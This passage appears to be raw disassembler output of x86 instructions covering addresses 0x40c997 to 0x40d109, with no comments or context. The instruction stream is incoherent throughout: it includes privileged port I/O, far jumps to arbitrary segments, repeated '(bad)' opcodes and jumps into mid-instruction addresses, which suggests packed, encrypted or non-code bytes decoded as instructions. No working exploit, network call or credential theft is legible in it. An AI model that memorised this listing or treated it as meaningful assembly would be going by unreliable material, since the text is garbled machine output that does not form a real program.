  40c997:	jae    0x40c91d
  40c999:	je     0x40c9f1
  40c99b:	sub    eax,0x50454be4
  40c9a0:	sbb    eax,0x22a72ea5
  40c9a5:	ret    0xc093
  40c9a8:	sub    ecx,DWORD PTR [esi]
  40c9aa:	mov    ?,WORD PTR [eax+ebx*1+0x4a]
  40c9ae:	dec    ebp
  40c9af:	mov    ebx,0x4aac2090
  40c9b4:	cwde   
  40c9b5:	daa    
  40c9b6:	out    0x56,al
  40c9b8:	mov    eax,ds:0xec609977
  40c9bd:	and    DWORD PTR [edx+ebp*8],ebx
  40c9c0:	mov    eax,0x54872c22
  40c9c5:	scas   eax,DWORD PTR es:[edi]
  40c9c6:	into   
  40c9c7:	jae    0x40ca30
  40c9c9:	xchg   ebx,eax
  40c9ca:	outs   dx,BYTE PTR ds:[esi]
  40c9cb:	pop    ecx
  40c9cc:	in     eax,dx
  40c9cd:	test   al,0x28
  40c9cf:	push   ecx
  40c9d0:	les    ebp,FWORD PTR [edx+0xe]
  40c9d3:	xchg   edi,eax
  40c9d4:	xchg   BYTE PTR [esi],al
  40c9d6:	sbb    ecx,DWORD PTR [ebx-0x6eac1242]
  40c9dc:	lock or DWORD PTR [ecx+ebp*1],ebp
  40c9e0:	aad    0x5a
  40c9e2:	pop    ecx
  40c9e3:	sbb    ah,BYTE PTR [ebp+0x2b0929ce]
  40c9e9:	cwde   
  40c9ea:	pushf  
  40c9eb:	cmc    
  40c9ec:	pop    ss
  40c9ed:	inc    ecx
  40c9ee:	mov    al,ds:0x852995ba
  40c9f3:	jmp    0x40c9d5
  40c9f5:	sbb    al,0x57
  40c9f7:	(bad)  
  40c9f8:	test   BYTE PTR [ebp+0x35],al
  40c9fb:	cmp    al,0xf
  40c9fd:	fidivr WORD PTR [ecx-0x35]
  40ca00:	in     al,dx
  40ca01:	out    dx,eax
  40ca02:	outs   dx,BYTE PTR ds:[esi]
  40ca03:	add    DWORD PTR [edi+0x4ecf9e3c],esp
  40ca09:	dec    ecx
  40ca0a:	mov    esi,0x76e9b2b8
  40ca0f:	lds    edi,FWORD PTR [ecx+0x6812f55c]
  40ca15:	xlat   BYTE PTR ds:[ebx]
  40ca16:	add    ebx,DWORD PTR [ebp+0x71db0db5]
  40ca1c:	enter  0x8bb,0x43
  40ca20:	push   esi
  40ca21:	fiadd  DWORD PTR [edi+0x11]
  40ca24:	mov    ebp,0x7faa7c30
  40ca29:	sub    eax,0x4487a67
  40ca2e:	mov    fs,WORD PTR [ecx-0x34c77242]
  40ca34:	aas    
  40ca35:	loop   0x40c9fd
  40ca37:	fwait
  40ca38:	gs pop eax
  40ca3a:	popf   
  40ca3b:	xchg   esi,eax
  40ca3c:	in     al,0x3a
  40ca3e:	xchg   ebx,eax
  40ca3f:	pop    edx
  40ca40:	aas    
  40ca41:	clc    
  40ca42:	sbb    al,0x57
  40ca44:	hlt    
  40ca45:	jo     0x40ca38
  40ca47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca48:	xor    ebp,0xf7f1590a
  40ca4e:	inc    esi
  40ca4f:	xor    eax,0x162243f6
  40ca54:	mov    edx,0x5e68fd05
  40ca59:	test   eax,0xda897f31
  40ca5e:	lods   al,BYTE PTR ds:[esi]
  40ca5f:	gs jmp 0x857d:0x7ed32f6d
  40ca67:	cdq    
  40ca68:	pushf  
  40ca69:	adc    BYTE PTR [ebx],bl
  40ca6b:	js     0x40ca23
  40ca6d:	es aad 0x20
  40ca70:	fsubr  QWORD PTR [edx+ebp*4]
  40ca73:	or     BYTE PTR [edi],ch
  40ca75:	sti    
  40ca76:	mov    ebp,esi
  40ca78:	jmp    0xdb7f1126
  40ca7d:	je     0x40ca1d
  40ca7f:	popa   
  40ca80:	push   ebx
  40ca81:	mov    ds:0x81a60bc8,eax
  40ca86:	mov    ch,BYTE PTR [eax-0x59]
  40ca89:	out    0xec,al
  40ca8b:	les    esp,FWORD PTR [ebx-0xbeff454]
  40ca91:	xchg   BYTE PTR [eax+0x74],cl
  40ca94:	sbb    al,0x61
  40ca96:	push   edi
  40ca97:	std    
  40ca98:	cmp    eax,0xb296bd8d
  40ca9d:	mov    bh,0xbc
  40ca9f:	scas   eax,DWORD PTR es:[edi]
  40caa0:	or     DWORD PTR [ecx],ebp
  40caa2:	and    edx,esi
  40caa4:	cs push ebx
  40caa6:	jmp    0x40ca2b
  40caa8:	inc    ebx
  40caa9:	imul   esi,DWORD PTR [esi+0x525d017d],0xffffff80
  40cab0:	jl     0x40ca68
  40cab2:	fwait
  40cab3:	(bad)  
  40cab4:	cmp    dl,BYTE PTR [ecx-0x631ff1e0]
  40caba:	jnp    0x40cae2
  40cabc:	imul   ebx,ecx,0x9c97fd88
  40cac2:	daa    
  40cac3:	or     eax,0x699791
  40cac8:	(bad)  [edx-0x10]
  40cacb:	and    DWORD PTR [ebx],edi
  40cacd:	fadd   DWORD PTR ds:0xba1390c9
  40cad3:	adc    DWORD PTR ds:0xa1215bae,0x20ddc911
  40cadd:	mov    eax,0x77b026eb
  40cae2:	call   DWORD PTR [ecx-0x74530c16]
  40cae8:	(bad)  
  40cae9:	fld    DWORD PTR [ebx+0x1e4e1fa3]
  40caef:	rol    DWORD PTR [ebx],1
  40caf1:	add    eax,DWORD PTR [edx-0x22917087]
  40caf7:	push   ss
  40caf8:	mov    ebp,0xb697550
  40cafd:	mov    bl,0xdb
  40caff:	lahf   
  40cb00:	popf   
  40cb01:	push   ds
  40cb02:	test   edi,esp
  40cb04:	dec    ebp
  40cb05:	mov    ebp,DWORD PTR [esi+ebp*8]
  40cb08:	ror    DWORD PTR [edx-0x5bd24e74],1
  40cb0e:	test   eax,0x354e7489
  40cb13:	lds    ecx,FWORD PTR [eax+0x5d]
  40cb16:	xor    esp,DWORD PTR ds:[edi+0x1]
  40cb1a:	aam    0xb2
  40cb1c:	xchg   DWORD PTR ds:0x29ca4ac6,edx
  40cb22:	pop    ss
  40cb23:	int    0xdc
  40cb25:	and    al,0xa3
  40cb27:	sbb    eax,0xc5a55e26
  40cb2c:	shl    BYTE PTR [edi-0x7e],cl
  40cb2f:	mov    ds:0xa315d6f7,al
  40cb34:	mov    edx,DWORD PTR [edx+eiz*1]
  40cb37:	jmp    0xe8f6:0x18146069
  40cb3e:	mov    WORD PTR [edi],ds
  40cb40:	dec    ecx
  40cb41:	imul   edx,DWORD PTR [eax-0x13],0x955534aa
  40cb48:	loope  0x40cb4f
  40cb4a:	push   edx
  40cb4b:	imul   edx,edi,0xa6f530ad
  40cb51:	sbb    DWORD PTR [edx-0x16e80983],esi
  40cb57:	lock call 0xdd58cb78
  40cb5d:	mov    eax,ebp
  40cb5f:	daa    
  40cb60:	arpl   WORD PTR [ecx],ax
  40cb62:	xchg   DWORD PTR [di],eax
  40cb65:	xor    bh,BYTE PTR [ecx+0x2f]
  40cb68:	imul   ecx,ecx,0x33
  40cb6b:	popf   
  40cb6c:	fidiv  WORD PTR [ebx]
  40cb6e:	pop    ss
  40cb6f:	xor    al,0x24
  40cb71:	adc    eax,0x45e7b03c
  40cb76:	clc    
  40cb77:	jo     0x40cb54
  40cb79:	shl    ebx,1
  40cb7b:	jno    0x40cbca
  40cb7d:	add    DWORD PTR [ebx],edx
  40cb7f:	xor    eax,0xcfc3a32b
  40cb84:	sbb    BYTE PTR [ecx+0x2f4ec9d2],bh
  40cb8a:	nop
  40cb8b:	(bad)  
  40cb8c:	fsub   QWORD PTR [esi+edi*4]
  40cb8f:	push   0xffffffff
  40cb91:	ret    0x58c9
  40cb94:	mov    cl,0xa4
  40cb96:	inc    ebp
  40cb97:	fbld   TBYTE PTR [edi+0x6c]
  40cb9a:	cmp    DWORD PTR [edi+0x11],ecx
  40cb9d:	cmc    
  40cb9e:	cmp    DWORD PTR [ecx+ebp*4],eax
  40cba1:	xor    BYTE PTR [ebx-0x13],al
  40cba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cba5:	and    eax,0x512d9eca
  40cbaa:	rcl    BYTE PTR [ebx],0x51
  40cbad:	sub    eax,0xf1ba969f
  40cbb2:	or     DWORD PTR [ecx],ebx
  40cbb4:	les    ecx,FWORD PTR [ebp+0x73]
  40cbb7:	cmp    al,ah
  40cbb9:	add    BYTE PTR [ecx],cl
  40cbbb:	jae    0x40cc32
  40cbbd:	mov    ebp,0x433b7d28
  40cbc2:	ja     0x40cb52
  40cbc4:	pusha  
  40cbc5:	mov    al,ds:0x87669449
  40cbca:	jmp    0x40cbf5
  40cbcc:	mov    al,0x97
  40cbce:	leave  
  40cbcf:	loope  0x40cb51
  40cbd1:	add    eax,0xf88055e
  40cbd6:	mov    ecx,0xe213198f
  40cbdb:	call   0x4e609148
  40cbe0:	(bad)  
  40cbe1:	jo     0x40cb66
  40cbe3:	sti    
  40cbe4:	sub    dh,BYTE PTR [eax+ecx*1]
  40cbe7:	dec    ebp
  40cbe8:	fadd   QWORD PTR [ecx+0x1c]
  40cbeb:	pop    ds
  40cbec:	sti    
  40cbed:	jecxz  0x40cc4e
  40cbef:	jmp    0x7c2e:0x30b1ef2b
  40cbf6:	sbb    esp,DWORD PTR [edi-0x3947f7bd]
  40cbfc:	in     al,0x1b
  40cbfe:	scas   eax,DWORD PTR es:[edi]
  40cbff:	int3   
  40cc00:	jne    0x40cc55
  40cc02:	ds jge 0x40cb88
  40cc05:	aam    0xc4
  40cc07:	ror    BYTE PTR [esi],cl
  40cc09:	rcr    DWORD PTR [eax-0x767ef7cc],cl
  40cc0f:	mov    esp,0x5f577efe
  40cc14:	fdiv   QWORD PTR [ebx-0x5c0ef6d3]
  40cc1a:	fist   WORD PTR fs:[ebx-0x3a2f3c1a]
  40cc21:	in     al,dx
  40cc22:	jp     0x40cc8c
  40cc24:	aas    
  40cc25:	jns    0x40cc4e
  40cc27:	cld    
  40cc28:	(bad)  
  40cc2a:	scas   eax,DWORD PTR es:[edi]
  40cc2b:	js     0x40cbc3
  40cc2d:	loop   0x40cc78
  40cc2f:	shl    BYTE PTR [ebp+0x6c],cl
  40cc32:	inc    edx
  40cc33:	gs or  al,0xf
  40cc36:	dec    ebp
  40cc37:	jb     0x40ccad
  40cc39:	xchg   edi,eax
  40cc3a:	das    
  40cc3b:	aam    0x9c
  40cc3d:	adc    al,BYTE PTR [eax]
  40cc3f:	outs   dx,BYTE PTR ds:[esi]
  40cc40:	fcom   DWORD PTR [edi]
  40cc42:	cld    
  40cc43:	idiv   BYTE PTR [eax-0x2a]
  40cc46:	inc    ebx
  40cc47:	push   ebp
  40cc48:	jp     0x40cbcb
  40cc4a:	sbb    DWORD PTR [eax+0x51],ebx
  40cc4d:	mov    BYTE PTR [esi],bl
  40cc4f:	stos   BYTE PTR es:[edi],al
  40cc50:	fsub   DWORD PTR ds:0xc7dc5a7
  40cc56:	sub    al,0xbf
  40cc58:	xor    edi,esp
  40cc5a:	xor    al,0x7a
  40cc5c:	sbb    al,BYTE PTR [ebp+0x7]
  40cc5f:	xchg   edi,eax
  40cc60:	mov    ch,0x31
  40cc62:	xchg   edx,eax
  40cc63:	shl    BYTE PTR [edx+0x6b346c9],cl
  40cc69:	rol    BYTE PTR [edx+0x7e],1
  40cc6c:	xchg   eax,esp
  40cc6e:	xor    al,0x9c
  40cc70:	aad    0xd7
  40cc72:	ins    DWORD PTR es:[edi],dx
  40cc73:	popf   
  40cc74:	into   
  40cc75:	div    BYTE PTR [ebp-0x27]
  40cc78:	push   ebp
  40cc79:	pop    eax
  40cc7a:	mov    ecx,0x6efa181d
  40cc7f:	out    dx,al
  40cc80:	push   edx
  40cc81:	inc    ebx
  40cc82:	add    ecx,DWORD PTR [ebx-0x404f5341]
  40cc88:	inc    esi
  40cc89:	(bad)  
  40cc8a:	dec    ebx
  40cc8b:	icebp  
  40cc8c:	pop    esi
  40cc8d:	mov    ds:0x680fd9ee,eax
  40cc92:	adc    DWORD PTR [edi],ebx
  40cc94:	push   edx
  40cc95:	out    0x27,eax
  40cc97:	dec    esi
  40cc98:	sub    dh,ah
  40cc9a:	and    BYTE PTR [esi-0x4d],bl
  40cc9d:	and    BYTE PTR [edi+0x9],ch
  40cca0:	pop    eax
  40cca1:	inc    esi
  40cca2:	inc    edx
  40cca3:	scas   eax,DWORD PTR es:[edi]
  40cca4:	ror    DWORD PTR [ecx],0xaa
  40cca7:	ror    BYTE PTR [esi+esi*4],0x70
  40ccab:	mov    ds:0x831be18f,al
  40ccb0:	scas   eax,DWORD PTR es:[edi]
  40ccb1:	lea    esi,[eax-0x1c]
  40ccb4:	bound  ebx,QWORD PTR [edx+0xaa2b189]
  40ccba:	push   esp
  40ccbb:	scas   al,BYTE PTR es:[edi]
  40ccbc:	or     ch,BYTE PTR [ebx-0x2aea5363]
  40ccc2:	jne    0x40ccf3
  40ccc4:	jmp    0x40cc59
  40ccc6:	pusha  
  40ccc7:	cwde   
  40ccc8:	mov    esp,0x89ad142c
  40cccd:	call   0xa513cabb
  40ccd2:	xchg   edi,eax
  40ccd3:	sbb    DWORD PTR [edi+0x48],eax
  40ccd6:	push   ds
  40ccd7:	inc    eax
  40ccd8:	call   0xa8c05994
  40ccdd:	jge    0x40cc8f
  40ccdf:	in     eax,dx
  40cce0:	xchg   edx,eax
  40cce1:	jns    0x40ccd4
  40cce3:	mul    DWORD PTR [ebp+0x23]
  40cce6:	leave  
  40cce7:	pop    esp
  40cce8:	and    al,0x58
  40ccea:	leave  
  40cceb:	ja     0x40ccc7
  40cced:	ds pop eax
  40ccef:	mov    es,WORD PTR [esi-0x2c]
  40ccf2:	mov    cl,0xf3
  40ccf4:	cmp    eax,0x713d9d18
  40ccf9:	pop    es
  40ccfa:	sub    BYTE PTR [esi+0x7e248553],dh
  40cd00:	ficomp WORD PTR [ebp+0x2a]
  40cd03:	mov    dl,dl
  40cd05:	fcom   DWORD PTR [ebp-0x4d46443d]
  40cd0b:	jp     0x40cd1e
  40cd0d:	xor    edi,DWORD PTR [ebx]
  40cd0f:	ins    DWORD PTR es:[edi],dx
  40cd10:	cdq    
  40cd11:	rcl    BYTE PTR [esi+0x16],0xd5
  40cd15:	dec    edi
  40cd16:	ja     0x40cd16
  40cd18:	push   ds
  40cd19:	dec    ebp
  40cd1a:	mov    cl,0xfe
  40cd1c:	xor    al,0xd2
  40cd1e:	inc    eax
  40cd1f:	jmp    0xe3f2:0xba2c939d
  40cd26:	mov    dh,BYTE PTR [edi+0x27f527e1]
  40cd2c:	sub    BYTE PTR [ebx],0xf9
  40cd2f:	dec    eax
  40cd30:	adc    esi,DWORD PTR [ebp+0x9147b7b]
  40cd36:	js     0x40cd86
  40cd38:	call   0x60f0:0x2a66a48e
  40cd3f:	into   
  40cd40:	fucom  st(4)
  40cd42:	mov    ebp,0x4623570d
  40cd47:	pushf  
  40cd48:	scas   al,BYTE PTR es:[edi]
  40cd49:	or     BYTE PTR [ebp+0x2f96d2b0],dh
  40cd4f:	cmc    
  40cd50:	add    ecx,DWORD PTR [edi+0x2b797a84]
  40cd56:	scas   al,BYTE PTR es:[edi]
  40cd57:	push   ecx
  40cd58:	fmul   DWORD PTR [ecx+0x35]
  40cd5b:	and    eax,DWORD PTR [edx]
  40cd5d:	jns    0x40ccf2
  40cd5f:	imul   ebx,DWORD PTR [edx+0x25],0x82a7c497
  40cd66:	pop    ebp
  40cd67:	sbb    ecx,DWORD PTR [ebp-0x28]
  40cd6a:	add    ecx,edx
  40cd6c:	nop
  40cd6d:	push   ds
  40cd6e:	ret    0xc217
  40cd71:	and    eax,0xe15a09b
  40cd76:	push   edx
  40cd77:	cmp    ah,BYTE PTR [ebp-0x20]
  40cd7a:	jns    0x40cdce
  40cd7c:	stos   DWORD PTR es:[edi],eax
  40cd7d:	fidivr DWORD PTR [esi]
  40cd7f:	cmp    eax,0x5014062c
  40cd84:	mov    ds:0x73e5cb3c,al
  40cd89:	cmp    BYTE PTR [edx+0x7e3544b9],bh
  40cd8f:	adc    esi,DWORD PTR ds:0x9b0a4d2c
  40cd95:	inc    edx
  40cd96:	inc    edi
  40cd97:	sbb    eax,0x42061cdb
  40cd9c:	add    al,0xec
  40cd9e:	xchg   ebx,eax
  40cd9f:	sbb    ch,bh
  40cda1:	sbb    edx,DWORD PTR [ecx]
  40cda3:	rcl    BYTE PTR [edi+eiz*1],0x5a
  40cda7:	sub    BYTE PTR [ebp+ecx*4-0x5c],bl
  40cdab:	push   es
  40cdac:	imul   esi,DWORD PTR [eax-0x35979af4],0xb5ea3530
  40cdb6:	sti    
  40cdb7:	rcr    DWORD PTR [ecx+eax*1+0x6bcfed6f],1
  40cdbe:	(bad)  
  40cdbf:	(bad)  
  40cdc0:	mov    ecx,0x97067ec6
  40cdc5:	mov    BYTE PTR [edx],al
  40cdc7:	imul   ebp,DWORD PTR [edx],0x2444a34f
  40cdcd:	call   0x7ed3:0x6c34e948
  40cdd4:	fsub   QWORD PTR ds:0x987d842b
  40cdda:	xlat   BYTE PTR ds:[ebx]
  40cddb:	xchg   edx,eax
  40cddc:	repz or edx,DWORD PTR [ecx-0x6842ca5e]
  40cde3:	xchg   BYTE PTR [esp+eax*2],dl
  40cde6:	pop    edi
  40cde7:	fst    QWORD PTR [esi]
  40cde9:	xchg   esi,eax
  40cdea:	dec    esi
  40cdeb:	rol    BYTE PTR [esi+0x65],0x22
  40cdef:	pushf  
  40cdf0:	adc    esp,DWORD PTR [esi]
  40cdf2:	adc    al,0xc
  40cdf4:	fistp  QWORD PTR [esi]
  40cdf6:	imul   ebp,DWORD PTR [edx],0xbfd384d8
  40cdfc:	xor    DWORD PTR [ebx],eax
  40cdfe:	cmp    eax,0x75e1fc6
  40ce03:	push   es
  40ce04:	push   ebp
  40ce05:	std    
  40ce06:	jmp    edi
  40ce08:	xor    al,0xac
  40ce0a:	lock imul esi,DWORD PTR [ecx+0x17],0x71ac2f4c
  40ce12:	in     eax,0x6a
  40ce14:	mov    eax,0xfa9becd8
  40ce19:	stos   DWORD PTR es:[edi],eax
  40ce1a:	test   al,0x17
  40ce1c:	stos   BYTE PTR es:[edi],al
  40ce1d:	jge    0x40ce63
  40ce1f:	sahf   
  40ce20:	push   ebx
  40ce21:	add    al,0x9c
  40ce23:	sar    al,cl
  40ce25:	cmc    
  40ce26:	xchg   DWORD PTR [edi+0x3a68ccf7],ecx
  40ce2c:	or     DWORD PTR [edi],esp
  40ce2e:	mov    BYTE PTR [eax-0x49],ah
  40ce31:	mov    al,0xb1
  40ce33:	push   ebx
  40ce34:	hlt    
  40ce35:	adc    eax,ecx
  40ce37:	icebp  
  40ce38:	mov    BYTE PTR [edi+0x485a2350],ch
  40ce3e:	in     al,0x18
  40ce40:	test   DWORD PTR [ecx+0x74f949d6],eax
  40ce46:	fdiv   QWORD PTR [eax+0x1]
  40ce49:	(bad)  
  40ce4a:	cli    
  40ce4b:	inc    ebp
  40ce4c:	sub    esi,DWORD PTR [eax+edx*8-0xa0fcbf7]
  40ce53:	out    0xb3,eax
  40ce55:	cmp    DWORD PTR [esi-0x2c09edec],edx
  40ce5b:	mov    esp,esi
  40ce5d:	add    al,0x2b
  40ce5f:	xchg   DWORD PTR [ebx-0x30],ebx
  40ce62:	(bad)
  40ce65:	nop
  40ce66:	sbb    edi,ebx
  40ce68:	popa   
  40ce69:	xchg   ecx,eax
  40ce6a:	lea    edi,[ecx+0x40]
  40ce6d:	xor    ebp,DWORD PTR [ebp+0x31c1338e]
  40ce73:	sar    DWORD PTR [esi+ebp*2-0x5e],1
  40ce77:	fmulp  st(5),st
  40ce79:	or     al,0x6b
  40ce7b:	add    eax,0x2c35225c
  40ce80:	adc    BYTE PTR [eax-0x28f8ef7b],cl
  40ce86:	and    bl,BYTE PTR [eax-0x6c87cc29]
  40ce8c:	sbb    eax,0x2188ad5d
  40ce91:	dec    BYTE PTR [ecx]
  40ce93:	ins    BYTE PTR es:[edi],dx
  40ce94:	mov    ecx,0x76f95ee3
  40ce99:	cmp    ecx,DWORD PTR [edi+eiz*2-0x6725aece]
  40cea0:	push   edi
  40cea1:	pusha  
  40cea2:	fstp   QWORD PTR [edi]
  40cea4:	imul   ebp,DWORD PTR [eax],0x61165a87
  40ceaa:	push   ecx
  40ceab:	cmp    BYTE PTR [eax-0x440c6918],dh
  40ceb1:	mov    DWORD PTR [esp+ecx*4],ebp
  40ceb4:	pop    es
  40ceb5:	adc    BYTE PTR [ebx+ebp*2+0x47],dh
  40ceb9:	imul   eax,DWORD PTR [ecx+0x10],0x530654e1
  40cec0:	push   cs
  40cec1:	je     0x40cf25
  40cec3:	xor    eax,0x1e1f1a3e
  40cec8:	rcr    cl,0xa9
  40cecb:	test   eax,0xee0cb1f1
  40ced0:	test   al,0xf5
  40ced2:	hlt    
  40ced3:	dec    ebp
  40ced4:	icebp  
  40ced5:	jno    0x40ce92
  40ced7:	mov    ds:0x9bd3f418,al
  40cedc:	mov    BYTE PTR ds:0x4349fc0a,0x9e
  40cee3:	pop    edx
  40cee4:	fld    TBYTE PTR [edi+0x778b95ed]
  40ceea:	and    eax,0x7123ab71
  40ceef:	repnz dec DWORD PTR [ecx+0x65]
  40cef3:	mov    BYTE PTR [ebx+0xc6ce003],dh
  40cef9:	pop    edx
  40cefa:	pop    edx
  40cefb:	icebp  
  40cefc:	push   ebp
  40cefd:	lea    ebx,[eax]
  40ceff:	daa    
  40cf00:	adc    DWORD PTR [ebx-0x1],esp
  40cf03:	imul   edx,DWORD PTR [eax+eax*2+0x3c],0xffffffe8
  40cf08:	test   DWORD PTR [ebp+0x30],0x60470e94
  40cf0f:	je     0x40cf38
  40cf11:	and    esi,DWORD PTR [ebx]
  40cf13:	and    al,0xf9
  40cf15:	mov    al,ds:0x89e29e64
  40cf1a:	rcl    BYTE PTR [ebp+eax*8+0x5c],0xba
  40cf1f:	cmp    DWORD PTR [ebx+0x7f],ecx
  40cf22:	cmp    dh,BYTE PTR [edx+0x5cd61e1d]
  40cf28:	mov    ah,0x85
  40cf2a:	xchg   ebx,eax
  40cf2b:	(bad)  
  40cf2c:	aam    0x9e
  40cf2e:	inc    esp
  40cf2f:	call   0x7e59:0x4be1bfa7
  40cf36:	les    esi,FWORD PTR [edi-0x12]
  40cf39:	inc    esi
  40cf3a:	mov    edi,DWORD PTR [ebx+0x6120541c]
  40cf40:	push   esp
  40cf41:	push   ss
  40cf42:	mov    esp,0x5261e16
  40cf47:	adc    ch,ch
  40cf49:	call   0xc030:0x40056dfa
  40cf50:	sub    dl,ch
  40cf52:	retf   
  40cf53:	test   eax,0x7a9feccf
  40cf58:	bswap  esi
  40cf5a:	bound  esi,QWORD PTR [esi+0x49]
  40cf5d:	data16 or BYTE PTR [edi-0x54e8ea3a],0x17
  40cf65:	cmc    
  40cf66:	adc    DWORD PTR [ebp+0x2e],edx
  40cf69:	pop    esi
  40cf6a:	mov    dl,0x6b
  40cf6c:	out    dx,al
  40cf6d:	das    
  40cf6e:	leave  
  40cf6f:	icebp  
  40cf70:	jno    0x40cf8e
  40cf72:	dec    esi
  40cf73:	ficom  DWORD PTR [edi-0x6f]
  40cf76:	aas    
  40cf77:	das    
  40cf78:	sub    cl,BYTE PTR [ecx-0x6e9f8056]
  40cf7e:	xchg   esi,eax
  40cf7f:	or     cl,bh
  40cf81:	fsub   QWORD PTR [ebx+ecx*8+0x37]
  40cf85:	or     BYTE PTR [edi+eax*2+0x65],al
  40cf89:	pop    edx
  40cf8a:	test   BYTE PTR [esi],dl
  40cf8c:	add    bl,BYTE PTR [ebp+0x795dad3d]
  40cf92:	xchg   edx,eax
  40cf93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf94:	mov    ecx,0xe7eb58af
  40cf99:	jnp    0x40cfdc
  40cf9b:	mov    dh,0xfa
  40cf9d:	ret    0xfae9
  40cfa0:	in     eax,dx
  40cfa1:	movd   mm5,DWORD PTR [ecx+0xb81fd62]
  40cfa8:	xchg   edx,eax
  40cfa9:	scas   eax,DWORD PTR es:[edi]
  40cfaa:	mov    ds:0x1d04bcb6,eax
  40cfaf:	es pop ebx
  40cfb1:	out    dx,eax
  40cfb2:	in     eax,dx
  40cfb3:	imul   esi,ebp,0x2a42a1e5
  40cfb9:	pushf  
  40cfba:	dec    edx
  40cfbb:	mov    esi,0x36b8655e
  40cfc0:	out    0x88,eax
  40cfc2:	ins    BYTE PTR es:[edi],dx
  40cfc3:	imul   edi,DWORD PTR [edi],0xe
  40cfc6:	in     al,dx
  40cfc7:	bound  edi,QWORD PTR [ebx]
  40cfc9:	rol    DWORD PTR [ebp-0x63],1
  40cfcc:	push   ebx
  40cfcd:	outs   dx,BYTE PTR ds:[esi]
  40cfce:	outs   dx,DWORD PTR ds:[esi]
  40cfcf:	push   es
  40cfd0:	jl     0x40d026
  40cfd2:	push   eax
  40cfd3:	and    BYTE PTR [eax],0x9e
  40cfd6:	lods   al,BYTE PTR ds:[esi]
  40cfd7:	dec    edi
  40cfd8:	int    0xa5
  40cfda:	add    dl,BYTE PTR [ebx+edx*8+0x15095619]
  40cfe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfe2:	pop    ss
  40cfe3:	pop    esp
  40cfe4:	xlat   BYTE PTR ds:[ebx]
  40cfe5:	mov    al,0xaa
  40cfe7:	sbb    BYTE PTR [ebx],bh
  40cfe9:	xchg   ebx,eax
  40cfea:	add    al,0x21
  40cfec:	mov    edx,0x28050e17
  40cff1:	xor    DWORD PTR [ebp+edx*2+0xc],0x6d
  40cff6:	and    DWORD PTR [eax+0x12],ebx
  40cff9:	xor    al,dl
  40cffb:	scas   eax,DWORD PTR es:[edi]
  40cffc:	ins    DWORD PTR es:[edi],dx
  40cffd:	(bad)  
  40cffe:	fs jg  0x40cf98
  40d001:	cmp    ecx,DWORD PTR [esi+0x35f62a98]
  40d007:	std    
  40d008:	sub    cl,BYTE PTR [eax]
  40d00a:	dec    esp
  40d00b:	push   ebp
  40d00c:	mov    al,ds:0xdf300233
  40d011:	push   es
  40d012:	adc    al,0xb6
  40d014:	mov    edi,DWORD PTR [ecx]
  40d016:	ja     0x40d02a
  40d018:	fld    QWORD PTR [esi+0x322e7c9]
  40d01e:	cmp    BYTE PTR [eax],ah
  40d020:	popa   
  40d021:	outs   dx,BYTE PTR ds:[esi]
  40d022:	xlat   BYTE PTR ds:[ebx]
  40d023:	ret    0xfc3d
  40d026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d027:	nop
  40d028:	leave  
  40d029:	call   0xe23c7da
  40d02e:	and    cl,ch
  40d030:	sub    ch,BYTE PTR [esi+0x47a228b]
  40d036:	aas    
  40d037:	add    DWORD PTR [ebp+0x5881157f],eax
  40d03d:	or     BYTE PTR [edi-0x53],dh
  40d040:	pop    esi
  40d041:	inc    eax
  40d042:	lods   al,BYTE PTR ds:[esi]
  40d043:	cdq    
  40d044:	pop    ss
  40d045:	mov    ds:0xd6cd48ea,eax
  40d04a:	adc    al,0xd8
  40d04c:	cld    
  40d04d:	mov    ebp,0x732913e2
  40d052:	rcl    dh,cl
  40d054:	popf   
  40d055:	loope  0x40d09c
  40d057:	les    edi,FWORD PTR [ebx+0x76]
  40d05a:	xor    al,0x25
  40d05c:	mov    esi,0x7172eef
  40d061:	mov    BYTE PTR [edx+0x6805b07e],dh
  40d067:	adc    eax,0xcafb83ce
  40d06c:	mov    edx,0x4cc0d712
  40d071:	inc    ebx
  40d072:	fcomp  QWORD PTR [edi+0x24]
  40d075:	ror    BYTE PTR [ecx+0x6a],0x61
  40d079:	and    DWORD PTR [edi+0x58],0x4dce95f5
  40d080:	ret    0x1ea6
  40d083:	cmp    bh,BYTE PTR [edx]
  40d085:	add    bh,al
  40d087:	daa    
  40d088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d089:	or     edi,DWORD PTR [eax-0x22]
  40d08c:	dec    ebp
  40d08d:	es (bad) 
  40d08f:	mov    edi,DWORD PTR [edi-0x165db1c1]
  40d095:	push   0x3f
  40d097:	xchg   esi,ebx
  40d099:	repz dec esp
  40d09b:	outs   dx,BYTE PTR ds:[esi]
  40d09c:	in     al,dx
  40d09d:	jp     0x40d0a2
  40d09f:	dec    ebp
  40d0a0:	pop    esp
  40d0a1:	popa   
  40d0a2:	sub    eax,0xbbc3b835
  40d0a7:	mov    edx,0x7099987a
  40d0ac:	mov    edi,0x9a472b84
  40d0b1:	and    DWORD PTR [ebx],0xffffffd5
  40d0b4:	(bad)  [eax+esi*4-0x7a]
  40d0b8:	jecxz  0x40d04f
  40d0ba:	add    DWORD PTR [ebp-0x9b3bc53],eax
  40d0c0:	sbb    al,0xba
  40d0c2:	cli    
  40d0c3:	inc    BYTE PTR [eax+ebp*1+0x241e9186]
  40d0ca:	xchg   edx,eax
  40d0cb:	add    eax,0x4a53728
  40d0d0:	inc    ebx
  40d0d1:	je     0x40d092
  40d0d3:	pop    edx
  40d0d4:	jno    0x40d0ca
  40d0d6:	push   eax
  40d0d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d8:	jmp    0x284b:0x7fcc0f93
  40d0df:	stos   DWORD PTR es:[edi],eax
  40d0e0:	stc    
  40d0e1:	scas   al,BYTE PTR es:[edi]
  40d0e2:	dec    ebx
  40d0e3:	daa    
  40d0e4:	mov    edi,0xb527fcc1
  40d0e9:	je     0x40d0be
  40d0eb:	(bad)  
  40d0ec:	adc    eax,0x75c4df37
  40d0f1:	mov    edx,0x9f8894e
  40d0f6:	mov    ss,WORD PTR [esi+0x27351cf3]
  40d0fc:	test   DWORD PTR ds:0x9d9cbcb6,eax
  40d102:	leave  
  40d103:	ret    0xfa5a
  40d106:	jecxz  0x40d108
  40d108:	stos   BYTE PTR es:[edi],al
  40d109:	imul   ecx,DWORD PTR [eax-0x2da11e08],0xbb5866cf
